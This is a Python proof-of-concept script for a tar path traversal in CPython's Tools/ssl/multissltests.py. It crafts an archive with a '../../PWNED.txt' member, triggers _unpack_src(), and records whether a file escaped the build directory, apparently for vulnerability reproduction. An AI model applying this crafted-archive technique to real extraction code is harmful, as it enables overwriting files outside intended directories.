#!/usr/bin/env python3
"""
PoC: Path Traversal in CPython's Tools/ssl/multissltests.py (_unpack_src)

This script triggers the traversal by:
  1) Importing the real multissltests.py from a given path (or auto-detected).
  2) Creating a crafted tar.gz named like an OpenSSL source bundle containing a member:
       "<name>/../../PWNED.txt"
  3) Calling BuildOpenSSL(...)._unpack_src() which uses tarfile.extractall(...) on modified TarInfo entries without sanitizing "..".
  4) Verifying that "PWNED.txt" was written OUTSIDE the intended build_dir.

Exit codes:
  0 - Vulnerability reproduced (file escaped build dir)
  1 - Not vulnerable / could not reproduce
  2 - Setup/import error

No external network, build tools, or compilation is performed :)
"""
import argparse
import hashlib
import importlib.util
import io
import json
import os
import sys
import tarfile
import tempfile
from datetime import datetime
from pathlib import Path
import shutil

def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()

def import_multissltests(module_path: Path):
    if not module_path.exists():
        raise FileNotFoundError(f"multissltests.py not found at: {module_path}")
    spec = importlib.util.spec_from_file_location("multissl", str(module_path))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)  # type: ignore
    # Quick sanity check for expected API
    getattr(mod, "BuildOpenSSL")
    return mod

def craft_malicious_tar(dst_tar: Path, version: str):
    # Create a tar.gz with a member that escapes two directories up
    member_name = f"openssl-{version}/../../PWNED.txt"
    data = b"Multissl path traversal reached this file.\n"
    with tarfile.open(dst_tar, "w:gz") as tf:
        ti = tarfile.TarInfo(name=member_name)
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    return member_name

def main():
    parser = argparse.ArgumentParser(description="PoC for path traversal in Tools/ssl/multissltests.py")
    parser.add_argument("-m", "--module", type=Path, default=None,
                        help="Path to CPython's Tools/ssl/multissltests.py (defaults to ./multissltests.py if present, else fails).")
    parser.add_argument("-o", "--output", type=Path, default=None,
                        help="Output directory for sandbox (defaults to a temp dir under ./poc_multissl_{ts}).")
    parser.add_argument("--version", default="3.1.8",
                        help="Version string to embed in crafted tarball name (default: 3.1.8).")
    args = parser.parse_args()

    # Resolve module path
    candidate = args.module or Path.cwd() / "multissltests.py"
    try:
        mod = import_multissltests(candidate)
    except Exception as e:
        # Fall back to common repo layout: Tools/ssl/multissltests.py
        fallback = Path.cwd() / "Tools" / "ssl" / "multissltests.py"
        try:
            mod = import_multissltests(fallback)
            candidate = fallback
        except Exception:
            print(f"[!] Failed to import multissltests.py from {candidate} or {fallback}: {e}", file=sys.stderr)
            sys.exit(2)

    # Prepare sandbox
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outdir = args.output or (Path.cwd() / f"poc_multissl_{ts}")
    if outdir.exists():
        shutil.rmtree(outdir)
    outdir.mkdir(parents=True)
    basedir = outdir / "base"
    basedir.mkdir()
    (outdir / "evidence").mkdir()

    # Where the vulnerable code expects sources/builds
    src_dir = basedir / "src"
    src_dir.mkdir()
    version = str(args.version)
    tar_name = f"openssl-{version}.tar.gz"
    tar_path = src_dir / tar_name

    # Create malicious archive
    member_name = craft_malicious_tar(tar_path, version)

    # Instantiate a builder with minimal args it expects
    class _Args:
        def __init__(self, base_directory: Path):
            self.base_directory = str(base_directory)
            self.system = None
            self.force = True
            self.keep_sources = True

    builder = mod.BuildOpenSSL(version, _Args(basedir))

    # Sanity: confirm where _unpack_src will put the build dir
    build_dir = Path(builder.build_dir)
    escaped_target = basedir / "PWNED.txt"

    # Trigger the vulnerable extraction
    try:
        builder._unpack_src()  # This calls tarfile.extractall(...) on crafted members
        vulnerable = escaped_target.exists()
    except Exception as e:
        vulnerable = False
        with open(outdir / "evidence" / "exception.txt", "w", encoding="utf-8") as f:
            f.write(f"Exception during _unpack_src(): {e!r}\n")

    # Collect evidence
    report = {
        "module_path": str(candidate.resolve()),
        "module_sha256": sha256(candidate),
        "poc_directory": str(outdir.resolve()),
        "base_directory": str(basedir.resolve()),
        "build_dir_expected": str(build_dir),
        "crafted_archive": str(tar_path),
        "crafted_member": member_name,
        "escaped_target": str(escaped_target),
        "escaped_target_exists": vulnerable,
        "python_version": sys.version,
    }

    with open(outdir / "evidence" / "report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    # Save directory listings
    for sub in (outdir, basedir, src_dir, build_dir.parent):
        listing_file = outdir / "evidence" / (sub.name + "_ls.txt")
        try:
            with open(listing_file, "w", encoding="utf-8") as f:
                for p in sorted(sub.rglob("*")):
                    try:
                        s = p.stat()
                        f.write(f"{p} [{s.st_size} bytes]\n")
                    except Exception:
                        f.write(f"{p} [stat failed]\n")
        except Exception:
            pass

    # Save hashes if the escaped target exists
    if vulnerable:
        with open(outdir / "evidence" / "pwned.sha256", "w", encoding="utf-8") as f:
            f.write(f"{sha256(escaped_target)}  {escaped_target.name}\n")

    # Final user-facing message
    print("=== multissltests.py Path Traversal PoC ===")
    print(f"Loaded module: {candidate.resolve()}")
    print(f"Sandbox dir : {outdir.resolve()}")
    print(f"Base dir    : {basedir.resolve()}")
    print(f"Build dir   : {build_dir}")
    print(f"Archive     : {tar_path}")
    print(f"Member name : {member_name}")
    print(f"Escaped file: {escaped_target}")
    print("")
    if vulnerable:
        print("[VULNERABLE] Escaped file was created OUTSIDE build dir.")
        print("You can check the 'evidence' folder for more info and the report.")
        sys.exit(0)
    else:
        print("[NOT VULNERABLE] Could not create escaped file. The code path may be patched or behavior differs.")
        sys.exit(1)

if __name__ == "__main__":
    main()
